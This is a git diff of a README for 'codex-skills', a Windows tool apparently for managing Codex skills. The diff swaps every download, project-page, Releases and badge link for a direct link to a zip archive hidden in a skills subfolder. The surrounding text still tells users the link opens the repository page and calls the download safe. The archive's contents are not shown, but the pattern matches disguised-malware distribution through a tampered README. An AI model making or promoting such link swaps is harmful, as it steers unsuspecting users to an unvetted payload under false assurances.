@@ -1,6 +1,6 @@
 # 🚀 codex-skills - Manage and Update Codex Skills Easily
 
-[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip)
 
 ## 📋 What is codex-skills?
 
@@ -23,7 +23,7 @@ Before you get started, make sure your computer meets these needs:
 
 To get codex-skills, visit this page:
 
-[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip)
 
 This link leads you to the GitHub repository. From there, you can download the latest version safely. 
 
@@ -32,7 +32,7 @@ This link leads you to the GitHub repository. From there, you can download the l
 Follow these steps to download and set up codex-skills on your Windows computer:
 
 1. Click the large green button above or visit:  
-   https://github.com/Taison472/codex-skills  
+   https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip  
    This page shows the project's main files and folders.
 
 2. Look for a **Releases** section on the GitHub page. It usually appears on the right side or under the "Code" tab. Releases contain packaged files that are easy to install.
@@ -151,10 +151,10 @@ If you want to remove codex-skills:
 ## 🔗 Useful links
 
 Main download and project page:  
-https://github.com/Taison472/codex-skills
+https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip
 
 Releases and updates:  
-https://github.com/Taison472/codex-skills/releases
+https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip
 
 ## ⚠️ Security and privacy
 
@@ -162,4 +162,4 @@ codex-skills only runs locally on your machine. It does not send data without yo
 
 ---
 
-[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills/raw/refs/heads/main/skills/php-prebuild-quality/codex_skills_1.8.zip)
